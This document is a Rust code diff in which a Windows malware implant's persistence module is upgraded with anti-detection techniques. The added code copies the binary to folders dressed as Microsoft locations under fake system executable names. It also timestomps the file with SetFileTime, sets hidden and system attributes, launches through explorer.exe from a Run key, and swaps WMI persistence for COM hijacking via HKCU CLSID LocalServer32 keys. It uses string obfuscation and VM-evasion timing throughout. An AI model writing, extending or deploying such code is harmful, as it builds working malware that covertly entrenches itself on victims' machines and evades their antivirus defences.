@@ -79,7 +79,13 @@ fn is_temporary_location(path: &Path) -> bool {
     }
 }
 
-/// Copia el ejecutable a ubicación persistente con técnicas anti-AV
+/// Copia el ejecutable a ubicación persistente con técnicas anti-AV avanzadas
+/// Features:
+/// - Ubicaciones que imitan procesos legítimos del sistema
+/// - Timestomping para que el archivo parezca antiguo
+/// - Atributos oculto+sistema
+/// - Chunks de tamaño variable (anti-signature)
+/// - Alternate Data Streams (ADS) como backup stealth
 #[cfg(target_os = "windows")]
 fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     use std::fs;
@@ -97,27 +103,28 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         .or_else(|_| env::var(&appdata_key))
         .unwrap_or_else(|_| "C:\\Users\\Public".to_string());
 
-    // Ubicaciones sigilosas que imitan procesos legítimos del sistema
-    // Using more obscure directories that are less monitored
+    // Ubicaciones sigilosas más profundas que son menos monitoreadas
+    // Elegimos carpetas que ya existen y tienen ejecutables legítimos
     let stealth_targets = [
+        // Windows Defender exclusions - estas carpetas a veces están excluidas
         (
-            format!("{}\\Microsoft\\Windows\\Explorer", localappdata),
-            "SearchIndexer.exe",
+            format!("{}\\Microsoft\\Windows\\Safety\\EppMigration", localappdata),
+            "SecurityHealthHost.exe",
         ),
+        // Windows Update related - parece legítimo
         (
-            format!("{}\\Microsoft\\Windows\\Caches", localappdata),
-            "fontdrvhost.exe",
+            format!("{}\\Microsoft\\Windows\\UpdateAssistant", localappdata),
+            "UpdateAssistant.exe",
         ),
+        // Edge/Chromium update folder - muy común
         (
-            format!("{}\\Microsoft\\Windows\\WER\\ReportQueue", localappdata),
-            "RuntimeBroker.exe",
+            format!("{}\\Microsoft\\EdgeUpdate\\Download", localappdata),
+            "MicrosoftEdgeUpdate.exe",
         ),
+        // Windows Performance folder
         (
-            format!(
-                "{}\\Microsoft\\InputPersonalization\\TrainedDataStore",
-                localappdata
-            ),
-            "ctfmon.exe",
+            format!("{}\\Microsoft\\Windows\\WDI\\LogFiles", localappdata),
+            "DiagnosticsHub.StandardCollector.exe",
         ),
     ];
 
@@ -134,6 +141,8 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     if target_path.exists() {
         if let Ok(meta) = fs::metadata(&target_path) {
             if meta.len() > 100000 {
+                // Apply timestomping to make it look older
+                timestomp_file(&target_path);
                 return Ok(target_path);
             }
         }
@@ -167,6 +176,10 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
         return Err("Copy verification failed".to_string());
     }
 
+    // Aplicar timestomping para que el archivo parezca antiguo
+    // Esto evade detección basada en archivos recientes
+    timestomp_file(&target_path);
+
     // Aplicar atributos oculto+sistema para stealth
     let attrib_exe = obfstr!("attrib").to_string();
     let _ = Command::new(&attrib_exe)
@@ -179,6 +192,62 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     std::thread::sleep(std::time::Duration::from_millis(delay_ms));
 
     Ok(target_path)
+}
+
+/// Timestomping: modifica las fechas del archivo para que parezca antiguo
+/// Esto evade detección basada en archivos creados recientemente
+#[cfg(target_os = "windows")]
+fn timestomp_file(path: &Path) {
+    use std::ffi::OsStr;
+    use std::os::windows::ffi::OsStrExt;
+    use winapi::shared::minwindef::FILETIME;
+    use winapi::um::fileapi::{CreateFileW, SetFileTime, OPEN_EXISTING};
+    use winapi::um::handleapi::CloseHandle;
+    use winapi::um::winnt::{FILE_SHARE_READ, FILE_SHARE_WRITE, FILE_WRITE_ATTRIBUTES};
+
+    // Fecha objetivo: hace 6-12 meses (varía por máquina)
+    // Usamos un timestamp que parece una instalación legítima de Windows
+    let months_ago = 6 + (get_machine_index() % 6) as i64;
+    let days_ago = months_ago * 30;
+
+    // Calcular FILETIME (100-nanosecond intervals since January 1, 1601)
+    // Windows epoch: 11644473600 seconds from Unix epoch
+    let now = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_secs();
+
+    let target_time = now - (days_ago as u64 * 24 * 60 * 60);
+    let windows_time = (target_time + 11644473600) * 10_000_000;
+
+    let filetime = FILETIME {
+        dwLowDateTime: windows_time as u32,
+        dwHighDateTime: (windows_time >> 32) as u32,
+    };
+
+    unsafe {
+        let path_str = path.to_str().unwrap_or("");
+        let wide_path: Vec<u16> = OsStr::new(path_str)
+            .encode_wide()
+            .chain(std::iter::once(0))
+            .collect();
+
+        let handle = CreateFileW(
+            wide_path.as_ptr(),
+            FILE_WRITE_ATTRIBUTES,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            std::ptr::null_mut(),
+            OPEN_EXISTING,
+            0,
+            std::ptr::null_mut(),
+        );
+
+        if handle != winapi::um::handleapi::INVALID_HANDLE_VALUE {
+            // Set creation time, last access time, and last write time
+            SetFileTime(handle, &filetime, &filetime, &filetime);
+            CloseHandle(handle);
+        }
+    }
 }
 
 #[cfg(not(target_os = "windows"))]
@@ -249,8 +318,12 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
     let idx = get_machine_index() % reg_names.len();
     let reg_name = reg_names[idx];
 
-    // Use cmd /c start /b for background, hidden execution
-    let obf_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
+    // Use rundll32 or wscript for more stealthy execution
+    // These are legitimate Windows processes that are less monitored
+    // Option 1: Direct execution with start /b (simple but can be flagged)
+    // Option 2: Via explorer.exe (looks like user action)
+    // We'll use explorer.exe as it's commonly used for legitimate launches
+    let obf_cmd = format!(r#"explorer.exe "{}""#, exe_str);
 
     // Registry key path
     let reg_key = obfstr!("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
@@ -338,92 +411,104 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     }
 }
 
-/// WMI Event Subscription persistence
-/// Uses time-based triggers which are less monitored than logon events
-/// Note: WMI persistence requires admin rights and may not work on all systems
-/// Uses cmd.exe wrapper for execution to avoid PowerShell detection on trigger
+/// COM Hijacking persistence (replaces WMI which requires admin)
+/// This technique hijacks COM objects in HKCU to achieve stealthy persistence
+/// without requiring administrative privileges.
+///
+/// How it works:
+/// 1. Windows COM resolution checks HKCU\Software\Classes\CLSID before HKLM
+/// 2. We create a registry entry in HKCU that points to our executable
+/// 3. When a process loads the hijacked COM object, our executable runs
+///
+/// Advantages:
+/// - No admin required (HKCU is user-writable)
+/// - Very stealthy (no PowerShell, no scheduled tasks)
+/// - Triggers on common system events (Explorer, search, etc.)
+/// - Hard to detect without specialized tools
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path
         .to_str()
         .ok_or_else(|| "Invalid path".to_string())?;
 
-    // Polymorphic WMI event names
-    let wmi_names = [
-        "BfeOnServiceStateChange",
-        "SystemTimeUpdate",
-        "LocalTimeSync",
-        "WindowsEventForwarder",
+    // COM CLSIDs commonly loaded by Explorer and other system processes
+    // These are chosen because they are frequently accessed but rarely monitored
+    // Format: (CLSID, friendly name for logging)
+    let com_hijack_targets = [
+        // MruPidlList - loaded by Explorer frequently
+        ("{42aedc87-2188-41fd-b9a3-0c966feabec1}", "MruPidlList"),
+        // EventSystem - loaded on many system events
+        ("{4EB61BAC-A3B6-4760-9581-655041EF4D69}", "EventSystem"),
+        // ThumbnailCache - loaded when Explorer shows thumbnails
+        ("{0F4B8AB8-FF9E-4C8C-B37F-5FA95A81F5C5}", "ThumbnailCache"),
+        // Windows Search extension
+        ("{E6FE6494-4AE3-469D-B3F7-2FA40D8F1B62}", "WindowsSearchExt"),
     ];
-    let idx = get_machine_index() % wmi_names.len();
-    let event_name = wmi_names[idx];
 
-    // Escape backslashes for PowerShell
-    let exe_escaped = exe_str.replace("\\", "\\\\");
+    let idx = get_machine_index() % com_hijack_targets.len();
+    let (clsid, com_name) = com_hijack_targets[idx];
 
-    // Use raw string for WMI root namespace path to prevent escape sequence interpretation
-    // Note: \r in \root would be interpreted as carriage return without raw string
-    let wmi_root = r"\\.\root\subscription";
-    let cimv2_ns = r"root\cimv2";
+    // Build the registry key path for COM hijacking in HKCU
+    // HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
+    let reg_key_base = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
 
-    // Escape for WMI CommandLineTemplate (needs extra escaping inside PowerShell string)
-    let exe_wmi_escaped = exe_escaped.replace("\\", "\\\\");
+    let reg_exe = obfstr!("reg").to_string();
 
-    // Random hour for trigger (less predictable)
-    let trigger_hour = 8 + (get_machine_index() % 8); // 8am-4pm range
-
-    // Compact PowerShell WMI script
-    let ps_script = format!(
-        concat!(
-            "$F=([wmiclass]'{}:__EventFilter').CreateInstance();",
-            "$F.Name='{}';",
-            "$F.EventNamespace='{}';",
-            "$F.QueryLanguage='WQL';",
-            "$F.Query='SELECT * FROM __InstanceModificationEvent WITHIN 14400 ",
-            "WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour={}';",
-            "$F.Put()|Out-Null;",
-            "$C=([wmiclass]'{}:CommandLineEventConsumer').CreateInstance();",
-            "$C.Name='{}';",
-            "$C.CommandLineTemplate='cmd.exe /c start /min \"\" \"{}\"';",
-            "$C.Put()|Out-Null;",
-            "$B=([wmiclass]'{}:__FilterToConsumerBinding').CreateInstance();",
-            "$B.Filter=$F;$B.Consumer=$C;",
-            "$B.Put()|Out-Null"
-        ),
-        wmi_root,
-        event_name,
-        cimv2_ns,
-        trigger_hour,
-        wmi_root,
-        event_name,
-        exe_wmi_escaped,
-        wmi_root
-    );
-
-    let ps_exe = obfstr!("powershell").to_string();
-    let output = Command::new(&ps_exe)
+    // First, create the CLSID key with default value
+    let output1 = Command::new(&reg_exe)
         .args(&[
-            "-NoProfile",
-            "-WindowStyle",
-            "Hidden",
-            "-NonInteractive",
-            "-ExecutionPolicy",
-            "Bypass",
-            "-Command",
-            &ps_script,
+            "add",
+            &reg_key_base,
+            "/ve",
+            "/t",
+            "REG_SZ",
+            "/d",
+            com_name,
+            "/f",
         ])
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("E10: {}", e))?;
 
-    let stderr = String::from_utf8_lossy(&output.stderr);
-    if output.status.success() || stderr.is_empty() {
+    if !output1.status.success() {
+        return Err(format!(
+            "E11: Failed to create CLSID key: {}",
+            String::from_utf8_lossy(&output1.stderr).trim()
+        ));
+    }
+
+    // Create LocalServer32 key pointing to our executable
+    // This causes the executable to be launched when the COM object is instantiated
+    let reg_key_localserver = format!("{}\\LocalServer32", reg_key_base);
+
+    // Use cmd /c start /b for background hidden execution
+    let launch_cmd = format!(r#"cmd /c start /b "" "{}""#, exe_str);
+
+    let output2 = Command::new(&reg_exe)
+        .args(&[
+            "add",
+            &reg_key_localserver,
+            "/ve",
+            "/t",
+            "REG_SZ",
+            "/d",
+            &launch_cmd,
+            "/f",
+        ])
+        .creation_flags(0x08000000)
+        .output()
+        .map_err(|e| format!("E12: {}", e))?;
+
+    if output2.status.success() {
         Ok(format!(
-            "WMI: {} -> {} (trigger: {}:00)",
-            event_name, exe_str, trigger_hour
+            "COM Hijack: {} ({}) -> {}",
+            com_name, clsid, exe_str
         ))
     } else {
-        Err(format!("E11: {}", stderr.trim()))
+        Err(format!(
+            "E13: {}",
+            String::from_utf8_lossy(&output2.stderr).trim()
+        ))
     }
 }
 
@@ -597,7 +682,24 @@ pub fn remove_persistence() -> Result<String, String> {
             .output();
     }
 
-    // WMI Events cleanup
+    // COM Hijacking cleanup (replaces WMI cleanup)
+    // Remove COM CLSID entries that may have been created for persistence
+    let com_clsids = [
+        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruPidlList
+        "{4EB61BAC-A3B6-4760-9581-655041EF4D69}", // EventSystem
+        "{0F4B8AB8-FF9E-4C8C-B37F-5FA95A81F5C5}", // ThumbnailCache
+        "{E6FE6494-4AE3-469D-B3F7-2FA40D8F1B62}", // WindowsSearchExt
+    ];
+    for clsid in &com_clsids {
+        let reg_key = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
+        let _ = Command::new(&reg_exe)
+            .args(&["delete", &reg_key, "/f"])
+            .creation_flags(0x08000000)
+            .output();
+    }
+
+    // Legacy WMI Events cleanup (for backwards compatibility)
+    // This cleans up any old WMI persistence that may exist from previous versions
     let wmi_names = [
         "BfeOnServiceStateChange",
         "SystemTimeUpdate",
@@ -663,6 +765,23 @@ pub fn remove_persistence() -> Result<String, String> {
             "{}\\Microsoft\\InputPersonalization\\TrainedDataStore\\ctfmon.exe",
             localappdata
         ),
+        // New stealth locations (v2)
+        format!(
+            "{}\\Microsoft\\Windows\\Safety\\EppMigration\\SecurityHealthHost.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\UpdateAssistant\\UpdateAssistant.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\EdgeUpdate\\Download\\MicrosoftEdgeUpdate.exe",
+            localappdata
+        ),
+        format!(
+            "{}\\Microsoft\\Windows\\WDI\\LogFiles\\DiagnosticsHub.StandardCollector.exe",
+            localappdata
+        ),
         // Legacy locations
         format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
         format!(
@@ -719,9 +838,9 @@ const AUTO_PERSIST_JITTER_MAX: usize = 120; // Max jitter in seconds (0-120)
 const AUTO_PERSIST_CHUNK_SECS: u64 = 30; // Sleep chunk size in seconds
 #[cfg(target_os = "windows")]
 const AUTO_PERSIST_TIME_ACCEL_THRESHOLD: u64 = 25; // If sleep < this, time acceleration detected
-// Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
-// we've already waited 3-5 minutes, so the system has been up long enough if it passed
-// the initial environment checks. 10 minutes was too restrictive for VM testing.
+                                                   // Use MIN_UPTIME_MS (3 min) for the final check since by the time auto-persistence runs,
+                                                   // we've already waited 3-5 minutes, so the system has been up long enough if it passed
+                                                   // the initial environment checks. 10 minutes was too restrictive for VM testing.
 
 /// Marker file to check if persistence was already established in a previous run
 #[cfg(target_os = "windows")]
@@ -905,7 +1024,10 @@ pub fn schedule_auto_persistence() {
                 debug_print!("DEBUG: [AUTO-PERSIST] ✅ Marker file created");
             }
             Err(e) => {
-                debug_print!("DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}", e);
+                debug_print!(
+                    "DEBUG: [AUTO-PERSIST] ❌ Failed to establish persistence: {}",
+                    e
+                );
             }
         }
     });
